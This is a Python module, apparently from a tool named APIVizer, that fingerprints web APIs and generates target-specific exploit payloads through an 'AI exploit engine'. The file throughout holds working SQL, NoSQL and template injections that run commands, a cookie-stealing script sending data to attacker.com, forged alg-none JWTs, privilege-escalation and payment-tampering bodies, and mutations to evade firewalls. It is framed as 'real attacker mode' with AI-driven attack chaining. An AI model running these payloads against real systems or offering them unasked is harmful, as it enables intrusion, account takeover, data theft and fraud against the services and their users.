        """Generate WAF bypass payloads based on fingerprinted WAF."""
        return [
            # Header-based bypasses
            'X-Forwarded-For: 127.0.0.1',
            'X-Original-URL: /admin',
            'X-Rewrite-URL: /admin',
            # Encoding bypasses
            '%00', '%0d%0a', '%ef%bb%bf',
            # HTTP method override
            'X-HTTP-Method-Override: PUT',
            'X-Method-Override: DELETE',
        ]

    def _generate_deep_payloads(self, interesting_payloads):
        """Generate deeper payloads based on interesting responses."""
        deep = []
        for payload in interesting_payloads[:5]:
            # Variations of what triggered interesting responses
            deep.append(payload + "'")
            deep.append(payload + " OR 1=1--")
            deep.append(payload + "{{7*7}}")
            deep.append(payload + ";id")
        return deep

    def _get_systematic_payloads(self):
        """Get payloads for systematic scanning across all categories."""
        systematic = []
        for category in ['sqli', 'xss', 'ssti', 'cmd_injection', 'ssrf']:
            if category in self._payload_templates:
                systematic.extend(self._payload_templates[category][:3])
        return systematic

    # ═══════════════════════════════════════��═══════════════════════════
    # REAL ATTACK ENGINE - Creates Custom Payloads from API Behavior
    # Not generic templates - actual attacker-grade exploit generation
    # ═══════════════════════════════════════════════════════════════════

    def craft_real_exploit(self, endpoint_url, method, headers, body, response_history):
        """
        REAL ATTACKER MODE: Creates unique payloads based on actual API behavior.

        Unlike generic scanners that spray known payloads, this engine:
        1. Fingerprints the exact technology stack from responses
        2. Identifies input reflection points and processing logic
        3. Discovers error handling patterns and info leaks
        4. Creates CUSTOM payloads specific to THIS API
        5. Mutates payloads based on what gets blocked vs what passes
        6. Chains findings into multi-step real exploits

        Args:
            endpoint_url: The target endpoint
            method: HTTP method
            headers: Request headers (reveals tech stack)
            body: Request body (reveals data model)
            response_history: List of previous responses from this endpoint

        Returns:
            List of crafted exploit payloads unique to this target
        """
        crafted = []
        tech_stack = self._fingerprint_tech_stack(headers, response_history)
        input_model = self._analyze_input_model(body, endpoint_url)
        reflection_points = self._find_reflection_points(response_history)
        error_patterns = self._analyze_error_patterns(response_history)

        # === PHASE 1: Technology-Specific Exploit Crafting ===
        crafted.extend(self._craft_tech_specific_payloads(tech_stack, input_model))

        # === PHASE 2: Input Reflection Exploitation ===
        crafted.extend(self._craft_reflection_exploits(reflection_points, input_model))

        # === PHASE 3: Error-Based Information Extraction ===
        crafted.extend(self._craft_error_based_exploits(error_patterns, tech_stack))

        # === PHASE 4: Business Logic Exploitation ===
        crafted.extend(self._craft_logic_exploits(endpoint_url, method, body, response_history))

        # === PHASE 5: Authentication/Authorization Testing ===
        crafted.extend(self._craft_auth_exploits(headers, endpoint_url, response_history))

        # === PHASE 6: Timing & Side-Channel Attacks ===
        crafted.extend(self._craft_timing_attacks(tech_stack, input_model))

        # === PHASE 7: Mutation-Based Payload Evolution ===
        if self.attack_memory.get(endpoint_url, {}).get('blocked'):
            crafted.extend(self._evolve_blocked_payloads(
                self.attack_memory[endpoint_url]['blocked'],
                self.attack_memory[endpoint_url].get('successful', [])
            ))

        return crafted

    def _fingerprint_tech_stack(self, headers, response_history):
        """
        Real fingerprinting: Identify exact technology from response behavior.
        Not just header checking - behavioral analysis.
        """
        tech = {
            'server': None, 'framework': None, 'language': None,
            'database': None, 'waf': None, 'cdn': None,
            'api_framework': None, 'auth_type': None,
            'serialization': None, 'version_info': {}
        }

        # Header-based fingerprinting
        for resp in response_history:
            resp_headers = resp.get('headers', {})
            resp_body = resp.get('body', '')

            # Server identification
            server = resp_headers.get('server', resp_headers.get('Server', ''))
            if server:
                tech['server'] = server
                if 'nginx' in server.lower():
                    tech['version_info']['nginx'] = server
                elif 'apache' in server.lower():
                    tech['version_info']['apache'] = server

            # Framework detection from headers
            powered_by = resp_headers.get('x-powered-by', resp_headers.get('X-Powered-By', ''))
            if 'Express' in powered_by:
                tech['framework'] = 'express'
                tech['language'] = 'nodejs'
            elif 'PHP' in powered_by:
                tech['language'] = 'php'
            elif 'ASP.NET' in powered_by:
                tech['framework'] = 'aspnet'
                tech['language'] = 'csharp'

            # Framework detection from response patterns
            if resp_body:
                if '"detail":[{' in resp_body or '"loc":["body"' in resp_body:
                    tech['framework'] = 'fastapi'
                    tech['language'] = 'python'
                elif '"errors":[{"message"' in resp_body and '"locations"' in resp_body:
                    tech['api_framework'] = 'graphql'
                elif 'django' in resp_body.lower() or 'csrfmiddlewaretoken' in resp_body:
                    tech['framework'] = 'django'
                    tech['language'] = 'python'
                elif 'Spring' in resp_body or 'Whitelabel Error' in resp_body:
                    tech['framework'] = 'spring'
                    tech['language'] = 'java'
                elif 'laravel' in resp_body.lower() or 'symfony' in resp_body.lower():
                    tech['framework'] = 'laravel'
                    tech['language'] = 'php'
                elif 'gin-gonic' in resp_body.lower() or resp_headers.get('X-Request-Id'):
                    tech['framework'] = 'gin'
                    tech['language'] = 'go'

            # Database detection from error messages
            if resp_body:
                if 'mysql' in resp_body.lower() or 'mariadb' in resp_body.lower():
                    tech['database'] = 'mysql'
                elif 'postgresql' in resp_body.lower() or 'pg_' in resp_body:
                    tech['database'] = 'postgresql'
                elif 'mongodb' in resp_body.lower() or 'MongoError' in resp_body:
                    tech['database'] = 'mongodb'
                elif 'sqlite' in resp_body.lower():
                    tech['database'] = 'sqlite'
                elif 'mssql' in resp_body.lower() or 'SqlException' in resp_body:
                    tech['database'] = 'mssql'

            # Auth type detection
            auth = headers.get('Authorization', '')
            if auth.startswith('Bearer '):
                token = auth[7:]
                if token.count('.') == 2:
                    tech['auth_type'] = 'jwt'
                else:
                    tech['auth_type'] = 'oauth_bearer'
            elif auth.startswith('Basic '):
                tech['auth_type'] = 'basic'
            elif headers.get('X-API-Key') or headers.get('x-api-key'):
                tech['auth_type'] = 'api_key'

            # Serialization format detection
            content_type = resp_headers.get('content-type', resp_headers.get('Content-Type', ''))
            if 'json' in content_type:
                tech['serialization'] = 'json'
            elif 'xml' in content_type:
                tech['serialization'] = 'xml'
            elif 'protobuf' in content_type or 'grpc' in content_type:
                tech['serialization'] = 'protobuf'
            elif 'msgpack' in content_type:
                tech['serialization'] = 'msgpack'

        return tech

    def _analyze_input_model(self, body, url):
        """
        Understand the exact input model of the API endpoint.
        Maps every parameter, its type, constraints, and injection potential.
        """
        model = {
            'params': {},  # {name: {type, constraints, injectable, reflection}}
            'url_segments': [],  # Path parameters
            'query_params': [],
            'body_structure': None,
            'nested_depth': 0,
            'array_fields': [],
            'numeric_fields': [],
            'string_fields': [],
            'boolean_fields': [],
            'id_fields': [],
            'url_fields': [],
            'file_fields': [],
            'date_fields': [],
            'email_fields': []
        }

        # Parse URL segments for path parameters
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        segments = [s for s in parsed.path.split('/') if s]
        for i, seg in enumerate(segments):
            if seg.isdigit() or (len(seg) == 36 and '-' in seg):  # ID or UUID
                model['url_segments'].append({'index': i, 'value': seg, 'type': 'id'})
            elif seg.startswith('{') or any(c.isdigit() for c in seg):
                model['url_segments'].append({'index': i, 'value': seg, 'type': 'param'})

        # Parse query parameters
        if parsed.query:
            for k, v in urllib.parse.parse_qs(parsed.query).items():
                model['query_params'].append({'name': k, 'value': v[0] if v else '', 'type': self._infer_type(v[0] if v else '')})

        # Deep analyze body structure
        if isinstance(body, dict):
            model['body_structure'] = 'object'
            self._map_body_fields(body, model, prefix='')
        elif isinstance(body, list):
            model['body_structure'] = 'array'
        elif isinstance(body, str):
            try:
                import json
                parsed_body = json.loads(body)
                if isinstance(parsed_body, dict):
                    model['body_structure'] = 'object'
                    self._map_body_fields(parsed_body, model, prefix='')
            except (json.JSONDecodeError, ValueError):
                model['body_structure'] = 'raw_string'

        return model

    def _map_body_fields(self, obj, model, prefix='', depth=0):
        """Recursively map all fields in the request body."""
        if depth > 10:
            return
        model['nested_depth'] = max(model['nested_depth'], depth)

        for key, value in obj.items():
            full_key = f"{prefix}.{key}" if prefix else key
            field_info = {
                'type': type(value).__name__,
                'value': value,
                'injectable': True,
                'depth': depth
            }

            # Classify field by name patterns
            key_lower = key.lower()
            if any(k in key_lower for k in ['id', 'uid', 'userid', 'account_id', 'resource_id']):
                model['id_fields'].append(full_key)
                field_info['category'] = 'id'
            elif any(k in key_lower for k in ['url', 'link', 'href', 'redirect', 'callback', 'webhook']):
                model['url_fields'].append(full_key)
                field_info['category'] = 'url'
            elif any(k in key_lower for k in ['file', 'upload', 'attachment', 'image', 'document']):
                model['file_fields'].append(full_key)
                field_info['category'] = 'file'
            elif any(k in key_lower for k in ['email', 'mail']):
                model['email_fields'].append(full_key)
                field_info['category'] = 'email'
            elif any(k in key_lower for k in ['date', 'time', 'timestamp', 'created', 'updated']):
                model['date_fields'].append(full_key)
                field_info['category'] = 'date'
            elif isinstance(value, bool):
                model['boolean_fields'].append(full_key)
                field_info['category'] = 'boolean'
            elif isinstance(value, (int, float)):
                model['numeric_fields'].append(full_key)
                field_info['category'] = 'numeric'
            elif isinstance(value, str):
                model['string_fields'].append(full_key)
                field_info['category'] = 'string'
            elif isinstance(value, list):
                model['array_fields'].append(full_key)
                field_info['category'] = 'array'

            model['params'][full_key] = field_info

            # Recurse into nested objects
            if isinstance(value, dict):
                self._map_body_fields(value, model, prefix=full_key, depth=depth+1)
            elif isinstance(value, list) and value and isinstance(value[0], dict):
                self._map_body_fields(value[0], model, prefix=f"{full_key}[0]", depth=depth+1)

    def _infer_type(self, value):
        """Infer the data type from a string value."""
        if not value:
            return 'empty'
        if value.isdigit():
            return 'integer'
        if value.replace('.', '').isdigit():
            return 'float'
        if value.lower() in ('true', 'false'):
            return 'boolean'
        if '@' in value and '.' in value:
            return 'email'
        if value.startswith('http'):
            return 'url'
        if len(value) == 36 and value.count('-') == 4:
            return 'uuid'
        return 'string'

    def _find_reflection_points(self, response_history):
        """
        Identify where input values are reflected in responses.
        This reveals XSS, header injection, and template injection points.
        """
        reflections = []
        for resp in response_history:
            req_params = resp.get('request_params', {})
            resp_body = resp.get('body', '')
            resp_headers = resp.get('headers', {})

            if not resp_body:
                continue

            for param_name, param_value in req_params.items():
                if isinstance(param_value, str) and len(param_value) > 2:
                    # Check body reflection
                    if param_value in resp_body:
                        reflections.append({
                            'param': param_name,
                            'value': param_value,
                            'location': 'body',
                            'context': self._determine_reflection_context(param_value, resp_body)
                        })
                    # Check header reflection
                    for h_name, h_value in resp_headers.items():
                        if param_value in str(h_value):
                            reflections.append({
                                'param': param_name,
                                'value': param_value,
                                'location': f'header:{h_name}',
                                'context': 'header'
                            })
        return reflections

    def _determine_reflection_context(self, value, body):
        """Determine the HTML/JSON context where input is reflected."""
        idx = body.find(value)
        if idx == -1:
            return 'none'

        # Get surrounding context
        before = body[max(0, idx-50):idx]
        after = body[idx+len(value):idx+len(value)+50]

        if '<script' in before or '</script>' in after:
            return 'javascript'
        elif 'href="' in before or 'src="' in before:
            return 'attribute_url'
        elif '"' in before[-5:] and '"' in after[:5]:
            return 'attribute_value'
        elif '<' in before[-10:] and '>' in after[:10]:
            return 'html_tag'
        elif '{' in before[-5:] and '}' in after[:5]:
            return 'template'
        elif before.rstrip().endswith(':') or before.rstrip().endswith('='):
            return 'json_value'
        return 'html_body'

    def _analyze_error_patterns(self, response_history):
        """
        Analyze error responses to understand backend behavior.
        Error messages reveal database type, framework, file paths, etc.
        """
        patterns = {
            'error_format': None,  # json_error, html_error, plain_text
            'reveals_stack_trace': False,
            'reveals_file_paths': False,
            'reveals_db_queries': False,
            'reveals_internal_ips': False,
            'error_codes_seen': set(),
            'custom_error_fields': [],
            'debug_mode': False
        }

        for resp in response_history:
            status = resp.get('status_code', 0)
            body = resp.get('body', '')

            if status >= 400:
                patterns['error_codes_seen'].add(status)

                if not body:
                    continue

                # Detect error format
                if body.strip().startswith('{'):
                    patterns['error_format'] = 'json_error'
                elif '<html' in body.lower():
                    patterns['error_format'] = 'html_error'
                else:
                    patterns['error_format'] = 'plain_text'

                # Stack trace detection
                if 'Traceback' in body or 'at ' in body and '.java:' in body:
                    patterns['reveals_stack_trace'] = True
                if 'File "/' in body or 'File "C:\\' in body:
                    patterns['reveals_file_paths'] = True

                # SQL query revelation
                if 'SELECT' in body and 'FROM' in body:
                    patterns['reveals_db_queries'] = True

                # Internal IP detection
                if re.search(r'10\.\d+\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+', body):
                    patterns['reveals_internal_ips'] = True

                # Debug mode detection
                if 'DEBUG' in body or 'debug' in body.lower() and 'true' in body.lower():
                    patterns['debug_mode'] = True

        patterns['error_codes_seen'] = list(patterns['error_codes_seen'])
        return patterns

    def _craft_tech_specific_payloads(self, tech_stack, input_model):
        """
        Create payloads SPECIFIC to the identified technology.
        Not generic - these target exact versions and frameworks.
        """
        payloads = []

        # === MySQL-specific exploitation ===
        if tech_stack.get('database') == 'mysql':
            for field in input_model.get('string_fields', [])[:5]:
                payloads.extend([
                    {field: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- "},
                    {field: "' UNION SELECT 1,CONCAT(user(),0x3a,version()),3,4,5-- "},
                    {field: "' AND IF(1=1,BENCHMARK(5000000,SHA1('test')),0)-- "},
                    {field: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))-- "},
                ])

        # === PostgreSQL-specific exploitation ===
        elif tech_stack.get('database') == 'postgresql':
            for field in input_model.get('string_fields', [])[:5]:
                payloads.extend([
                    {field: "'; SELECT pg_sleep(5)-- "},
                    {field: "' UNION SELECT NULL,current_database(),current_user,version(),NULL-- "},
                    {field: "'; COPY (SELECT '') TO PROGRAM 'id'-- "},
                    {field: "' AND 1=CAST((SELECT version()) AS int)-- "},
                    {field: "' || (SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') || '"},
                ])

        # === MongoDB-specific exploitation ===
        elif tech_stack.get('database') == 'mongodb':
            for field in input_model.get('string_fields', [])[:5]:
                payloads.extend([
                    {field: {"$gt": ""}},
                    {field: {"$regex": ".*", "$options": "si"}},
                    {field: {"$where": "function(){return true}"}},
                    {field: {"$where": "sleep(5000)"}},
                    {"$where": f"this.{field}==this.{field}"},
                ])

        # === Node.js/Express specific ===
        if tech_stack.get('framework') == 'express':
            payloads.extend([
                {'__proto__': {'admin': True, 'role': 'admin'}},
                {'constructor': {'prototype': {'isAdmin': True}}},
                {'toString': {'__proto__': {'toString': True}}},
            ])
            for field in input_model.get('string_fields', [])[:3]:
                payloads.append({field: "{{this.constructor.constructor('return this.process.env')()}}"})
                payloads.append({field: "require('child_process').execSync('id').toString()"})

        # === Python/Django/FastAPI specific ===
        elif tech_stack.get('language') == 'python':
            for field in input_model.get('string_fields', [])[:3]:
                payloads.extend([
                    {field: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"},
                    {field: "{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}"},
                    {field: "__import__('os').popen('id').read()"},
                    {field: "{{request.__class__.__mro__[1].__subclasses__()}}"},
                ])

        # === Java/Spring specific ===
        elif tech_stack.get('language') == 'java':
            for field in input_model.get('string_fields', [])[:3]:
                payloads.extend([
                    {field: "${T(java.lang.Runtime).getRuntime().exec('id')}"},
                    {field: "#{T(java.lang.Runtime).getRuntime().exec('id')}"},
                    {field: "${applicationScope}"},
                    {field: "__${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}__"},
                ])

        # === JWT-specific attacks ===
        if tech_stack.get('auth_type') == 'jwt':
            payloads.extend([
                {'_jwt_attack': 'alg_none', 'description': 'Remove signature, set alg to none'},
                {'_jwt_attack': 'key_confusion', 'description': 'Switch RS256 to HS256 using public key'},
                {'_jwt_attack': 'kid_injection', 'payload': '../../../../../../dev/null'},
                {'_jwt_attack': 'exp_manipulation', 'description': 'Set exp to year 2099'},
                {'_jwt_attack': 'sub_takeover', 'description': 'Change sub claim to admin'},
                {'_jwt_attack': 'jku_redirect', 'description': 'Point jku to attacker-controlled JWK'},
            ])

        return payloads

    def _craft_reflection_exploits(self, reflection_points, input_model):
        """
        Create exploits based on WHERE input is reflected.
        Context-aware - different payloads for different reflection contexts.
        """
        payloads = []

        for reflection in reflection_points:
            param = reflection['param']
            context = reflection['context']

            if context == 'javascript':
                # Input reflected inside <script> tags - break out of string context
                payloads.extend([
                    {param: "';alert(document.domain);//"},
                    {param: "\";alert(document.domain);//"},
                    {param: "</script><script>fetch('https://attacker.com/'+document.cookie)</script>"},
                    {param: "'-require('child_process').exec('id')-'"},
                ])
            elif context == 'attribute_url':
                # Input in href/src attribute
                payloads.extend([
                    {param: "javascript:alert(document.domain)"},
                    {param: "data:text/html,<script>alert(1)</script>"},
                    {param: "//attacker.com/steal?c='+document.cookie+'"},
                ])
            elif context == 'attribute_value':
                # Input inside an HTML attribute value
                payloads.extend([
                    {param: '" onmouseover="alert(1)" x="'},
                    {param: "' onfocus='alert(1)' autofocus='"},
                    {param: '" style="background:url(javascript:alert(1))" x="'},
                ])
            elif context == 'template':
                # Input inside template engine expression
                payloads.extend([
                    {param: "{{7*7}}"},
                    {param: "${7*7}"},
                    {param: "{{constructor.constructor('return this')()}}"},
                    {param: "{{config.items()}}"},
                    {param: "<%= system('id') %>"},
                ])
            elif context == 'json_value':
                # Input reflected in JSON response value
                payloads.extend([
                    {param: '","admin":true,"x":"'},
                    {param: '","role":"superadmin","x":"'},
                    {param: '\\","__proto__":{"admin":true},"x":"'},
                ])
            elif context == 'header':
                # Input reflected in response header - CRLF injection
                payloads.extend([
                    {param: "value\r\nX-Injected: true"},
                    {param: "value\r\n\r\n<script>alert(1)</script>"},
                    {param: "value\r\nSet-Cookie: admin=true"},
                ])

        return payloads

    def _craft_error_based_exploits(self, error_patterns, tech_stack):
        """
        Exploit error handling to extract information.
        Use error responses as an oracle to exfiltrate data.
        """
        payloads = []

        if error_patterns.get('reveals_db_queries'):
            # Error-based SQL extraction
            payloads.extend([
                {'_error_sqli': "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- "},
                {'_error_sqli': "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)-- "},
                {'_error_sqli': "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))-- "},
            ])

        if error_patterns.get('reveals_stack_trace'):
            # Trigger detailed errors to extract file paths, class names
            payloads.extend([
                {'_trigger_error': None},  # Send null where object expected
                {'_trigger_error': []},    # Send array where object expected
                {'_trigger_error': 99999999999999999999},  # Integer overflow
                {'_trigger_error': 'A' * 100000},  # Buffer size test
                {'_trigger_error': {'__class__': 'exploit'}},  # Class confusion
            ])

        if error_patterns.get('debug_mode'):
            # Exploit debug mode for maximum info disclosure
            payloads.extend([
                {'_debug_exploit': '/__debug__/'},
                {'_debug_exploit': '/?debug=true&verbose=1'},
                {'_debug_exploit': '/actuator/env'},
                {'_debug_exploit': '/trace'},
                {'_debug_exploit': '/.env'},
                {'_debug_exploit': '/config'},
            ])

        return payloads

    def _craft_logic_exploits(self, url, method, body, response_history):
        """
        Create business logic exploits based on the API's behavior patterns.
        These are REAL attacks that exploit how the API processes data.
        """
        payloads = []

        # Analyze if this is a transactional endpoint
        url_lower = url.lower()
        is_financial = any(kw in url_lower for kw in ['pay', 'transfer', 'balance', 'order', 'cart', 'checkout', 'price', 'amount', 'credit', 'debit', 'fund'])
        is_user_mgmt = any(kw in url_lower for kw in ['user', 'account', 'profile', 'register', 'signup', 'role', 'permission'])
        is_resource = any(kw in url_lower for kw in ['file', 'upload', 'download', 'document', 'report', 'export'])

        if isinstance(body, dict):
            # === Financial Logic Exploits ===
            if is_financial:
                for key, val in body.items():
                    if isinstance(val, (int, float)) or (isinstance(val, str) and val.replace('.','').isdigit()):
                        payloads.extend([
                            {**body, key: -1},              # Negative value
                            {**body, key: 0},               # Zero value
                            {**body, key: 0.001},           # Micro amount
                            {**body, key: 99999999999},     # Overflow value
                            {**body, key: val if isinstance(val, str) else str(val) + '0' * 10},  # Append zeros
                            {**body, key: -int(val) if isinstance(val, int) else val},  # Negate
                        ])
                    if 'currency' in key.lower():
                        payloads.append({**body, key: 'XXX'})  # Invalid currency

            # === User/Permission Logic Exploits ===
            if is_user_mgmt:
                payloads.extend([
                    {**body, 'role': 'admin'},
                    {**body, 'is_admin': True},
                    {**body, 'permissions': ['*', 'admin:*', 'superuser']},
                    {**body, 'email_verified': True},
                    {**body, 'two_factor_enabled': False},
                    {**body, 'subscription_tier': 'enterprise'},
                    {**body, 'approved': True, 'status': 'active'},
                ])

            # === Race Condition Payloads ===
            # Mark these for concurrent execution
            if method == 'POST':
                payloads.append({'_race_condition': True, '_concurrent_count': 10, '_body': body})

            # === Parameter Pollution ===
            for key in list(body.keys())[:5]:
                # Send same parameter twice with different values
                payloads.append({**body, key: [body[key], 'admin']})
                # Type confusion
                if isinstance(body[key], str):
                    payloads.append({**body, key: True})
                    payloads.append({**body, key: 0})
                elif isinstance(body[key], bool):
                    payloads.append({**body, key: 'true'})
                    payloads.append({**body, key: 1})

        # === State Machine Abuse ===
        # Identify if we can skip steps in a workflow
        if any(kw in url_lower for kw in ['step', 'phase', 'stage', 'status', 'state']):
            payloads.extend([
                {'_state_skip': 'jump_to_final'},
                {'status': 'approved'},
                {'state': 'completed'},
                {'step': 999},
            ])

        return payloads

    def _craft_auth_exploits(self, headers, url, response_history):
        """
        Create authentication and authorization exploits specific to this API.
        Tests the exact auth mechanism in use.
        """
        payloads = []
        auth = headers.get('Authorization', '')

        # === JWT Token Manipulation ===
        if auth.startswith('Bearer ') and auth[7:].count('.') == 2:
            import base64
            token = auth[7:]
            parts = token.split('.')
            try:
                # Decode header
                header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
                header_json = base64.urlsafe_b64decode(header_b64).decode('utf-8', errors='replace')

                # Decode payload
                payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
                payload_json = base64.urlsafe_b64decode(payload_b64).decode('utf-8', errors='replace')

                import json
                header_data = json.loads(header_json)
                payload_data = json.loads(payload_json)

                # Craft alg:none attack
                none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=').decode()

                # Craft privilege escalation
                if 'role' in payload_data:
                    payload_data['role'] = 'admin'
                if 'sub' in payload_data:
                    payloads.append({'_jwt_modified': True, '_field': 'sub', '_value': 'admin'})
                if 'is_admin' in payload_data or 'admin' in str(payload_data):
                    payload_data['is_admin'] = True
                    payload_data['admin'] = True

                # Expired token reuse
                payload_data['exp'] = 9999999999
                modified_payload = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).rstrip(b'=').decode()

                payloads.extend([
                    {'Authorization': f'Bearer {none_header}.{modified_payload}.'},
                    {'Authorization': f'Bearer {parts[0]}.{modified_payload}.{parts[2]}'},
                    {'Authorization': 'Bearer ' + 'A' * 1000},  # Long token
                    {'Authorization': 'Bearer null'},
                    {'Authorization': 'Bearer undefined'},
                    {'Authorization': ''},  # Empty auth
                ])
            except Exception:
                pass

        # === IDOR Testing based on URL pattern ===
        if re.search(r'/(\d+)/?', url):
            current_id = re.search(r'/(\d+)/?', url).group(1)
            payloads.extend([
                {'_idor_test': url.replace(f'/{current_id}', '/0')},
                {'_idor_test': url.replace(f'/{current_id}', '/1')},
                {'_idor_test': url.replace(f'/{current_id}', f'/{int(current_id)-1}')},
                {'_idor_test': url.replace(f'/{current_id}', f'/{int(current_id)+1}')},
                {'_idor_test': url.replace(f'/{current_id}', '/99999')},
                {'_idor_test': url.replace(f'/{current_id}', '/-1')},
                {'_idor_test': url.replace(f'/{current_id}', '/admin')},
            ])

        # === Verb Tampering ===
        payloads.extend([
            {'_method_override': 'PUT', '_header': 'X-HTTP-Method-Override'},
            {'_method_override': 'DELETE', '_header': 'X-HTTP-Method-Override'},
            {'_method_override': 'PATCH', '_header': 'X-Method-Override'},
            {'_method_override': 'OPTIONS'},
            {'_method_override': 'TRACE'},
        ])

        return payloads

    def _craft_timing_attacks(self, tech_stack, input_model):
        """
        Create time-based blind exploitation payloads.
        When no visible output, use timing as the oracle.
        """
        payloads = []
        db = tech_stack.get('database', '')

        for field in input_model.get('string_fields', [])[:5]:
            if db == 'mysql':
                payloads.extend([
                    {field: "' AND SLEEP(5)-- "},
                    {field: "' AND IF(1=1,SLEEP(5),0)-- "},
                    {field: "' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)-- "},
                    {field: "' OR BENCHMARK(10000000,SHA1('test'))-- "},
                ])
            elif db == 'postgresql':
                payloads.extend([
                    {field: "'; SELECT pg_sleep(5)-- "},
                    {field: "' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)-- "},
                ])
            elif db == 'mssql':
                payloads.extend([
                    {field: "'; WAITFOR DELAY '0:0:5'-- "},
                    {field: "' AND 1=1; WAITFOR DELAY '0:0:5'-- "},
                ])
            elif db == 'mongodb':
                payloads.extend([
                    {field: {"$where": "sleep(5000)"}},
                    {field: {"$where": "function(){sleep(5000);return true}"}},
                ])
            else:
                # Generic timing for unknown DB
                payloads.extend([
                    {field: "' AND SLEEP(5)-- "},
                    {field: "'; SELECT pg_sleep(5)-- "},
                    {field: "' AND 1=BENCHMARK(5000000,SHA1('x'))-- "},
                    {field: {"$where": "sleep(5000)"}},
                ])

        # Command injection timing
        for field in input_model.get('string_fields', [])[:3]:
            payloads.extend([
                {field: "$(sleep 5)"},
                {field: "`sleep 5`"},
                {field: "| timeout 5"},
                {field: "; ping -c 5 127.0.0.1"},
            ])

        return payloads

    def _evolve_blocked_payloads(self, blocked_payloads, successful_payloads):
        """
        EVOLUTIONARY ALGORITHM: Mutate blocked payloads to bypass defenses.

        Takes payloads that were blocked by WAF/filters and evolves them:
        1. Analyze what patterns triggered blocking
        2. Apply mutations that preserve exploit logic but change syntax
        3. Combine features of successful payloads with blocked ones
        4. Create novel encodings the WAF hasn't seen
        """
        evolved = []

        for payload in blocked_payloads[:10]:
            if not isinstance(payload, str):
                payload = str(payload)

            # Mutation 1: Encoding variations
            evolved.append(payload.replace("'", "%27").replace(" ", "%20"))
            evolved.append(payload.replace("'", "\\'").replace('"', '\\"'))
            evolved.append(payload.replace("'", "\\x27").replace("<", "\\x3c"))

            # Mutation 2: Case randomization
            mutated = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
            evolved.append(mutated)

            # Mutation 3: Comment insertion (SQL)
            if any(kw in payload.upper() for kw in ['SELECT', 'UNION', 'OR', 'AND']):
                for kw in ['SELECT', 'UNION', 'OR', 'AND', 'FROM', 'WHERE']:
                    if kw in payload.upper():
                        commented = payload.replace(kw, f'{kw[0]}/*X*/{kw[1:]}')
                        commented = payload.replace(kw.lower(), f'{kw[0].lower()}/*X*/{kw[1:].lower()}')
                        evolved.append(commented)

            # Mutation 4: Whitespace substitution
            evolved.append(payload.replace(' ', '\t'))
            evolved.append(payload.replace(' ', '/**/'))
            evolved.append(payload.replace(' ', '%09'))
            evolved.append(payload.replace(' ', '\n'))

            # Mutation 5: Double encoding
            evolved.append(payload.replace("'", "%2527").replace('"', "%2522"))

            # Mutation 6: Unicode normalization bypass
            evolved.append(payload.replace("'", "\uff07").replace("<", "\uff1c"))
            evolved.append(payload.replace("/", "\u2215").replace("\\", "\u2216"))

            # Mutation 7: Null byte insertion
            evolved.append(payload[:len(payload)//2] + '%00' + payload[len(payload)//2:])

            # Mutation 8: Combine with successful patterns
            if successful_payloads:
                success = random.choice(successful_payloads) if isinstance(successful_payloads[0], str) else str(successful_payloads[0])
                # Take structure from successful, content from blocked
                evolved.append(success[:10] + payload[5:])

        return evolved[:30]  # Return top 30 evolved payloads


# ═══════════════════════════════════════════════════════════════════════
# MODULE INTERFACE - What apivizer.py imports
# ═══════════════════════════════════════════════════════════════════════

# Initialize connection on module load
_connection = MCPCopilotConnection()
_connection.connect()

# Export the AI engine for use by main apivizer
ai_engine = AIExploitEngine(mcp_connection=_connection)

# Connection status
MCP_CONNECTED = _connection.connected
CONNECTION_TYPE = _connection.connection_type
CONNECTION_STATUS = _connection.get_status()

def get_status():
    """Get current MCP connection status."""
    return {
        'connected': _connection.connected,
        'type': _connection.connection_type,
        'status': _connection.get_status(),
        'is_external': _connection.is_external_ai(),
        'capabilities': _connection.capabilities,
        'session_id': _connection.session_id
    }

def exploit_endpoint(endpoint_data):
    """
    Main entry point for AI-driven exploitation of an API endpoint.
    Called by apivizer when --opus mode is active.
    """
    # Step 1: AI analyzes the target
    analysis = ai_engine.analyze_target(endpoint_data)

    # Step 2: Generate context-aware payloads
    payloads = {}
    for attack_type in analysis['recommended_attacks']:
        payloads[attack_type] = ai_engine.generate_exploit_payloads(attack_type, endpoint_data)

    # Step 3: Craft REAL exploits based on API behavior
    real_exploits = ai_engine.craft_real_exploit(
        endpoint_data.get('url', ''),
        endpoint_data.get('method', 'GET'),
        endpoint_data.get('headers', {}),
        endpoint_data.get('body', {}),
        endpoint_data.get('response_history', [])
    )

    # Step 4: Get next action recommendation
    action = ai_engine.get_next_attack_action(endpoint_data.get('url', ''))

    return {
        'analysis': analysis,
        'payloads': payloads,
        'real_exploits': real_exploits,
        'next_action': action,
        'exploit_chains': ai_engine.exploit_chains
    }


if __name__ == "__main__":
    print(f"APIVizer MCP-Copilot Bridge v{__version__}")
    print(f"Connection Status: {CONNECTION_STATUS}")
    print(f"Connection Type: {CONNECTION_TYPE}")
    print(f"Capabilities: {_connection.capabilities}")
    print(f"Session ID: {_connection.session_id}")
    print(f"Payload Categories: {len(ai_engine._payload_templates)}")
    print(f"Total Base Payloads: {sum(len(v) for v in ai_engine._payload_templates.values())}")
    print(f"Real Exploit Engine: ACTIVE")
    print(f"Adaptive Learning: ENABLED")
